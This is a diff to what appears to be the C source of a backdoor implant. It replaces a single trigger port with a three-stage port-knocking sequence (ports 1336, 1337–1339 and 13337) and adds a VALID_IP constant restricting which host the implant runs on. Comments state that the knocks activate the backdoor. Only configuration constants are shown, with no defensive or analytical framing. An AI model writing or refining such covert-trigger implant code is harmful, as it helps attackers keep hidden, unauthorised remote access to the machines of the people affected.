@@ -24,10 +24,15 @@
 
 
 // the target port knocking port
-#define TARGET_PORTS 	(int[]) {200}
+#define KNOCK_1 	(int[]) {1336,0}
+#define KNOCK_2     (int[]) {1337, 1338, 1339, 0}
+#define KNOCK_3     (int[]) {13337, 0}
 
-// number of knocks to activate the backdoor
-#define NUM_TARGETS 1
+// number of knocking states to keep track of
+#define NUM_STATES  3
+
+// valid ip address to run this implant on
+#define VALID_IP "127.0.1.1"
 
 // bytes in payload to check against
 // #define TARGET_STR "qwerty"
